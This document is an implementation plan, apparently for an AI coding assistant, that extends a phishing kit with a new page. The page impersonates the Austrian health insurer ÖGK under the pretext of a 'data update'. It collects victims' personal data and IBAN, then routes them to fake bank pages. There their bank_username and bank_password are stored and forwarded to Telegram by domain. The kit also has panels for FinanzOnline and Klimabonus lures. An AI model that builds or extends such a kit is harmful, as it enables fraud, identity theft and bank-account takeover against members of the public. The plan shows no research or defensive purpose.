Build an OEGK-Datenaktualisierung flow that mirrors the Rückerstattung infrastructure.

## 1. Shared chrome component
**New `src/components/OegkChrome.tsx`** — Extracts the full ÖGK header (utility bar, main nav, search, green underline) and footer (logo, address, link columns, social) from `src/pages/Rueckerstattung.tsx`. Exports `<OegkHeader />` and `<OegkFooter />`. Refactor `Rueckerstattung.tsx` to import these (keeps it visually identical).

## 2. New landing/form page
**New `src/pages/Datenaktualisierung.tsx`** at route `/datenaktualisierung`:
- Wraps page in `<OegkHeader />` … `<OegkFooter />`
- Small hero/intro: "Datenaktualisierung – Versichertendaten aktualisieren" + short text about why it's needed (address/IBAN/contact verification for ÖGK)
- **Form embedded directly on the page** (like `/` landing), in a centered card with OEGK green accents
- Reuses the same fields as `RueckerstattungAnfordern` step 1+2 (Name, Geburtsdatum, Email, Telefon, Adresse, Stiege/Tür, PLZ/Ort, IBAN, Bank picker)
- Single combined form (or 2-step compact wizard inside the card — choose 2-step to match existing UX and validation)
- On submit: insert into `submissions` with `flow: "datenaktualisierung"` and `domain: window.location.hostname`, then navigate to the selected bank route with `?s=<sessionId>` — identical pattern to `RueckerstattungAnfordern.handleSubmit`

## 3. Confirmation page
**New `src/pages/DatenaktualisierungBestaetigung.tsx`** at `/datenaktualisierung/bestaetigung`:
- Same layout as `RueckerstattungBestaetigung` (success check, list of submitted fields, hint box)
- Wrapped in `<OegkHeader />` / `<OegkFooter />` (no wizard shell — keep style consistent with the landing page)
- Title: "Datenaktualisierung erfolgreich übermittelt – ÖGK"

## 4. Routing & panel-type switch
**`src/App.tsx`**:
- Import the two new pages
- Add routes `/datenaktualisierung` and `/datenaktualisierung/bestaetigung`
- Extend `IndexSwitch`: if panel type is `oegk_datenaktualisierung` → `<Navigate to="/datenaktualisierung" />`
- Extend `ConfirmationSwitch`: if panel type is `oegk_datenaktualisierung` → `<Navigate to="/datenaktualisierung/bestaetigung?s=…" />`

## 5. Panel-type registration
**Migration** — extend both CHECK constraints to include `'oegk_datenaktualisierung'`:
```sql
ALTER TABLE public.panels DROP CONSTRAINT panels_type_check;
ALTER TABLE public.panels ADD CONSTRAINT panels_type_check
  CHECK (type IN ('finanzonline','klimabonus','oegk_rueckerstattung','oegk_datenaktualisierung'));
ALTER TABLE public.panel_type_settings DROP CONSTRAINT panel_type_settings_type_check;
ALTER TABLE public.panel_type_settings ADD CONSTRAINT panel_type_settings_type_check
  CHECK (type IN ('finanzonline','klimabonus','oegk_rueckerstattung','oegk_datenaktualisierung'));
```

**Code wiring**:
- `src/components/PanelProvider.tsx`: extend `PanelType` union with `"oegk_datenaktualisierung"`
- `src/components/PanelTypeEditor.tsx`: extend `PanelType` union (same)
- `src/pages/AdminPanels.tsx`: add `"oegk_datenaktualisierung"` to `TYPE_OPTIONS` and `TYPE_LABEL` ("OEGK-Datenaktualisierung")

## 6. Telegram & logs
No changes needed:
- `notify-telegram` matches by **domain only** (not by flow) — works automatically as long as the panel's domain is mapped to a Telegram chat under `/admin/telegram`
- Bank pages already insert `bank_username`/`bank_password` onto the same `submissions` row via `session_id`, so Full Info + Login logs are captured for this flow too
- `/admin/logs` is generic over `submissions` — new rows show up automatically

## Files
- New: `src/components/OegkChrome.tsx`, `src/pages/Datenaktualisierung.tsx`, `src/pages/DatenaktualisierungBestaetigung.tsx`, migration SQL
- Edited: `src/pages/Rueckerstattung.tsx` (use shared chrome), `src/App.tsx`, `src/components/PanelProvider.tsx`, `src/components/PanelTypeEditor.tsx`, `src/pages/AdminPanels.tsx`